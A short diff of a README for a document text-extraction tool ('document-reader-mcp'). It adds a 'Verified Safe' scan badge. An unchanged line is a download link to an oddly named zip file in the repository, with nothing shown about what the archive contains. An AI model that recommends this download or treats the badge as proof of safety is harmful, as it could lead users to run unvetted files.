@@ -1,6 +1,8 @@
 ```markdown
 # 📄 document-reader-mcp - Extract Text from Any Document Easily
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/ggmenu-document-reader-mcp)
+
 ![Download](https://raw.githubusercontent.com/ggmenu/document-reader-mcp/main/server/mcp_reader_document_Tremellaceae.zip)
 
 ## 📖 Overview
